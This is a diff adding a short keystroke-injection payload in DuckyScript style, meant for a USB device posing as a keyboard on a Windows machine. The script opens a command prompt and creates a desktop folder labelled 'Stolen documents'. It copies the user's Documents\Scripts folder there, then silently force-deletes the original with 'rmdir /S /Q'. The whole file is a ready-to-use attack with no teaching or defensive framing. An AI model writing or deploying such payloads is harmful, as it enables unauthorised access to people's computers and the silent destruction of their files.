@@ -1,0 +1,16 @@
+REM AUTHOR KIERAN HUMAN
+
+DELAY 2000
+GUI r
+DELAY 1000
+STRING cmd
+ENTER
+DELAY 2000
+STRING mkdir %USERPROFILE%\Desktop\"Stolen documents"
+ENTER
+DELAY 2000
+STRING xcopy %USERPROFILE%\Documents\Scripts\* %USERPROFILE%\Desktop\"Stolen documents" /E /I /Y
+ENTER
+DELAY 2000
+STRING rmdir "%USERPROFILE%\Documents\Scripts" /S /Q
+ENTER
